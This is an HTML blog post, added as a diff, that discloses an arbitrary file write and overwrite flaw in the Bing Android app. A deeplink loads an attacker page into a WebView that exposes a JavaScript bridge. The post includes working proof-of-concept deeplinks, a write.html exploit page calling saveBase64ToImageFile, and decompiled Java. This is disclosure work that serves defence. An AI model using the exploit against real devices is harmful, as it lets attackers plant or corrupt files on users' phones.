@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Arbitrary File Write and File Overwrite via Exposed JSBridge in Bing Android | Neilmark Ochea / 0xnmo</title>
+<meta name="keywords" content="">
+<meta name="description" content="The Bing Android application allows attacker-controlled URLs to be loaded via a deeplink into a WebView that exposes a JavaScript bridge to the loaded page.">
+<meta name="author" content="Me">
+<link rel="canonical" href="http://localhost:1313/posts/6-write-overwrite-arbitrary-files-via-exposed-jsbridge/">
+<link crossorigin="anonymous" href="http://localhost:1313/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/6-write-overwrite-arbitrary-files-via-exposed-jsbridge/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/posts/6-write-overwrite-arbitrary-files-via-exposed-jsbridge/">
+  <meta property="og:site_name" content="Neilmark Ochea / 0xnmo">
+  <meta property="og:title" content="Arbitrary File Write and File Overwrite via Exposed JSBridge in Bing Android">
+  <meta property="og:description" content="The Bing Android application allows attacker-controlled URLs to be loaded via a deeplink into a WebView that exposes a JavaScript bridge to the loaded page.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-09-29T12:18:25+08:00">
+    <meta property="article:modified_time" content="2026-09-29T12:18:25+08:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Arbitrary File Write and File Overwrite via Exposed JSBridge in Bing Android">
+<meta name="twitter:description" content="The Bing Android application allows attacker-controlled URLs to be loaded via a deeplink into a WebView that exposes a JavaScript bridge to the loaded page.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Arbitrary File Write and File Overwrite via Exposed JSBridge in Bing Android",
+      "item": "http://localhost:1313/posts/6-write-overwrite-arbitrary-files-via-exposed-jsbridge/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Arbitrary File Write and File Overwrite via Exposed JSBridge in Bing Android",
+  "name": "Arbitrary File Write and File Overwrite via Exposed JSBridge in Bing Android",
+  "description": "The Bing Android application allows attacker-controlled URLs to be loaded via a deeplink into a WebView that exposes a JavaScript bridge to the loaded page.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Summary An attacker can exploit this issue to open malicious web content in the Bing Android application via deeplink and use the exposed JSBridge to write or overwrite files in the current directory.\nExploit An attacker remotely triggered the vulnerable flow through the app’s deeplink from a browser, SMS, or email. The deeplink loaded an attacker-controlled URL in the WebView, allowing the page to invoke the exposed JavaScript bridge.\n\u003ca href=\"sapphire://browser?url=https://nmochea.github.io/poc.html\"\u003eXploitz\u003c/a\u003e OR \u003ca href=\"Intent://browser?url=https://nmochea.github.io/poc.html#Intent;scheme=sapphire;action=android.intent.action.VIEW;end\"\u003eXploitz\u003c/a\u003e The deeplink causes the application to open an attacker‑controlled URL in its in‑app WebView. Because the WebView exposes a JSBridge without proper origin restrictions, the attacker page can call the bridge directly and cause the application to write arbitrary files or overwrite existing files, without user interaction.\nIn write.html: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003e\u003c/title\u003e \u003cscript type=\"text/javascript\"\u003e window.onload = function() { var content = 'Arbitray write file poc!'; var base64 = btoa(content); var url = 'https://attacker.com/poc.txt'; // Can be .txt, .pdf, .apk, .html, etc.. var contentDisposition = 'attachment; filename=\"poc.txt\"'; var mimeType = 'text/plain'; if (window.iabSDKJSBridge \u0026\u0026 window.iabSDKJSBridge.saveBase64ToImageFile) { window.iabSDKJSBridge.saveBase64ToImageFile(base64, url, contentDisposition, mimeType); } }; \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003c/html\u003e Technical Details The vulnerability begins with the application’s handling of deeplinks, which allows an attacker to launch the application and load an arbitrary URL in WebView. The WebView is initialized with JavaScript enabled and exposes powerful native interfaces (such as iabSDKJSBridge) to all loaded content, without origin checks or validation. The saveBase64ToImageFile method on this bridge allows arbitrary file writes to the Downloads directory, with attacker-controlled filename and content. If a file with the same name already exists, it is overwritten, leading to file corruption. This is not limited to .txt files; any extension or file type can be targeted.\nIn com.microsoft.sapphire.app.browser.BrowserActivity(onNewIntent):\nThis method receives the incoming Intent (including deeplinks), extracts the TemplateConfig extra (which contains the target URL), and passes it through to the BrowserMainFragment and ultimately to the InAppBrowserWebView for loading. There is no validation or restriction on the URL, so any deeplink can cause the app to load attacker-controlled content in a WebView.\n@Override public final void onNewIntent(Intent intent) { ... JSONObject jSONObject = this.x; if (jSONObject != null \u0026\u0026 (optString2 = jSONObject.optString(\"url\")) != null) { ... // Passes URL to BrowserMainFragment and InAppBrowserWebView } ... BrowserMainFragment browserMainFragment = this.w; if (browserMainFragment != null) { JSONObject jSONObject3 = this.x; ... bo5 config = new bo5(jSONObject3); ... um2 um2Var = browserMainFragment.V0; if (um2Var != null) { ... bo5 bo5Var = um2Var.d; if (bo5Var != null \u0026\u0026 (url = bo5Var.v) != null) { WebViewDelegate webViewDelegate2 = um2Var.i; if (webViewDelegate2 != null) { webViewDelegate2.loadUrl(url, um2Var.U(bo5Var)); } } } } } In com.microsoft.sapphire.app.browser.webview.InAppBrowserWebView(j method):\nThis method initializes the WebView, enables JavaScript, and registers the JavaScript interfaces without any origin restriction or validation. Any web content loaded in this WebView can access the exposed native methods.\npublic void j(Context context) { ... getSettings().setJavaScriptEnabled(true); addJavascriptInterface(new dbc(context, this), \"iabSDKJSBridge\"); addJavascriptInterface(new w7p(this), \"saTextSelBridge\"); ... } In defpackage.dbc(saveBase64ToImageFile method):\nThis method is exposed to JavaScript and allows writing arbitrary files to the Downloads directory. The filename is derived from attacker-controlled parameters (url, contentDisposition, mimeType) using URLUtil.guessFileName. The file is written using pt9.writeBytes, which overwrites any existing file with the same name, also there is no validation or restriction on file type or extension.\n@JavascriptInterface public void saveBase64ToImageFile(String base64, String url, String contentDisposition, String mimetype) { File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), URLUtil.guessFileName(url, contentDisposition, mimetype)); byte[] decoded = Base64.decode(base64, Base64.DEFAULT); pt9.writeBytes(file, decoded); ... } In defpackage.pt9(writeBytes method):\nThis utility method writes the provided bytes to the specified file. It opens the file in overwrite mode, so any existing file with the same name is replaced, leading to file corruption if the filename is reused.\npublic static void writeBytes(File file, byte[] data) { FileOutputStream fos = new FileOutputStream(file); fos.write(data); fos.close(); } ",
+  "wordCount" : "623",
+  "inLanguage": "en",
+  "datePublished": "2026-09-29T12:18:25+08:00",
+  "dateModified": "2026-09-29T12:18:25+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/6-write-overwrite-arbitrary-files-via-exposed-jsbridge/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Neilmark Ochea / 0xnmo",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="0xnmo (Alt + H)">
+                <img src="http://localhost:1313/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">0xnmo</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://mobilehackinglab.com" title="Pewpew!">
+                    <span>Pewpew!</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Arbitrary File Write and File Overwrite via Exposed JSBridge in Bing Android
+    </h1>
+    <div class="post-meta"><span title='2026-09-29 12:18:25 +0800 +08'>November 97, 292925</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>623 words</span>&nbsp;·&nbsp;<span>Me</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="summary"><strong>Summary</strong><a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
+<p>An attacker can exploit this issue to open malicious web content in the Bing Android application via deeplink and use the exposed JSBridge to write or overwrite files in the current directory.</p>
+<h2 id="exploit"><strong>Exploit</strong><a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<p>An attacker remotely triggered the vulnerable flow through the app’s deeplink from a browser, SMS, or email. The deeplink loaded an attacker-controlled URL in the WebView, allowing the page to invoke the exposed JavaScript bridge.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;sapphire://browser?url=https://nmochea.github.io/poc.html&#34;</span><span class="p">&gt;</span>Xploitz<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OR
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;Intent://browser?url=https://nmochea.github.io/poc.html#Intent;scheme=sapphire;action=android.intent.action.VIEW;end&#34;</span><span class="p">&gt;</span>Xploitz<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>The deeplink causes the application to open an attacker‑controlled URL in its in‑app WebView. Because the WebView exposes a JSBridge without proper origin restrictions, the attacker page can call the bridge directly and cause the application to write arbitrary files or overwrite existing files, without user interaction.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">In write.html:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">content</span> <span class="o">=</span> <span class="s1">&#39;Arbitray write file poc!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">base64</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;https://attacker.com/poc.txt&#39;</span><span class="p">;</span>   <span class="c1">// Can be .txt, .pdf, .apk, .html, etc..
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="kd">var</span> <span class="nx">contentDisposition</span> <span class="o">=</span> <span class="s1">&#39;attachment; filename=&#34;poc.txt&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">mimeType</span> <span class="o">=</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">iabSDKJSBridge</span> <span class="o">&amp;&amp;</span> <span class="nb">window</span><span class="p">.</span><span class="nx">iabSDKJSBridge</span><span class="p">.</span><span class="nx">saveBase64ToImageFile</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">.</span><span class="nx">iabSDKJSBridge</span><span class="p">.</span><span class="nx">saveBase64ToImageFile</span><span class="p">(</span><span class="nx">base64</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">contentDisposition</span><span class="p">,</span> <span class="nx">mimeType</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h2 id="technical-details"><strong>Technical Details</strong><a hidden class="anchor" aria-hidden="true" href="#technical-details">#</a></h2>
+<p>The vulnerability begins with the application&rsquo;s handling of deeplinks, which allows an attacker to launch the application and load an arbitrary URL in WebView. The WebView is initialized with JavaScript enabled and exposes powerful native interfaces (such as iabSDKJSBridge) to all loaded content, without origin checks or validation. The saveBase64ToImageFile method on this bridge allows arbitrary file writes to the Downloads directory, with attacker-controlled filename and content. If a file with the same name already exists, it is overwritten, leading to file corruption. This is not limited to .txt files; any extension or file type can be targeted.</p>
+<p><strong>In <code>com.microsoft.sapphire.app.browser.BrowserActivity(onNewIntent)</code>:</strong></p>
+<p>This method receives the incoming Intent (including deeplinks), extracts the TemplateConfig extra (which contains the target URL), and passes it through to the BrowserMainFragment and ultimately to the InAppBrowserWebView for loading. There is no validation or restriction on the URL, so any deeplink can cause the app to load attacker-controlled content in a WebView.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onNewIntent</span><span class="p">(</span><span class="n">Intent</span><span class="w"> </span><span class="n">intent</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">jSONObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">x</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">jSONObject</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">optString2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jSONObject</span><span class="p">.</span><span class="na">optString</span><span class="p">(</span><span class="s">&#34;url&#34;</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Passes URL to BrowserMainFragment and InAppBrowserWebView</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">BrowserMainFragment</span><span class="w"> </span><span class="n">browserMainFragment</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">w</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">browserMainFragment</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">jSONObject3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">x</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bo5</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">bo5</span><span class="p">(</span><span class="n">jSONObject3</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">um2</span><span class="w"> </span><span class="n">um2Var</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">browserMainFragment</span><span class="p">.</span><span class="na">V0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">um2Var</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">bo5</span><span class="w"> </span><span class="n">bo5Var</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">um2Var</span><span class="p">.</span><span class="na">d</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bo5Var</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bo5Var</span><span class="p">.</span><span class="na">v</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">WebViewDelegate</span><span class="w"> </span><span class="n">webViewDelegate2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">um2Var</span><span class="p">.</span><span class="na">i</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">webViewDelegate2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">webViewDelegate2</span><span class="p">.</span><span class="na">loadUrl</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">um2Var</span><span class="p">.</span><span class="na">U</span><span class="p">(</span><span class="n">bo5Var</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>In <code>com.microsoft.sapphire.app.browser.webview.InAppBrowserWebView(j method)</code>:</strong></p>
+<p>This method initializes the WebView, enables JavaScript, and registers the JavaScript interfaces without any origin restriction or validation. Any web content loaded in this WebView can access the exposed native methods.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">j</span><span class="p">(</span><span class="n">Context</span><span class="w"> </span><span class="n">context</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">getSettings</span><span class="p">().</span><span class="na">setJavaScriptEnabled</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">addJavascriptInterface</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">dbc</span><span class="p">(</span><span class="n">context</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;iabSDKJSBridge&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">addJavascriptInterface</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">w7p</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;saTextSelBridge&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>In <code>defpackage.dbc(saveBase64ToImageFile method)</code>:</strong></p>
+<p>This method is exposed to JavaScript and allows writing arbitrary files to the Downloads directory. The filename is derived from attacker-controlled parameters (url, contentDisposition, mimeType) using URLUtil.guessFileName. The file is written using pt9.writeBytes, which overwrites any existing file with the same name, also there is no validation or restriction on file type or extension.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@JavascriptInterface</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">saveBase64ToImageFile</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">base64</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">contentDisposition</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">mimetype</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="na">getExternalStoragePublicDirectory</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="na">DIRECTORY_DOWNLOADS</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URLUtil</span><span class="p">.</span><span class="na">guessFileName</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="n">contentDisposition</span><span class="p">,</span><span class="w"> </span><span class="n">mimetype</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">base64</span><span class="p">,</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">DEFAULT</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">pt9</span><span class="p">.</span><span class="na">writeBytes</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="n">decoded</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>In <code>defpackage.pt9(writeBytes method)</code>:</strong></p>
+<p>This utility method writes the provided bytes to the specified file. It opens the file in overwrite mode, so any existing file with the same name is replaced, leading to file corruption if the filename is reused.</p>
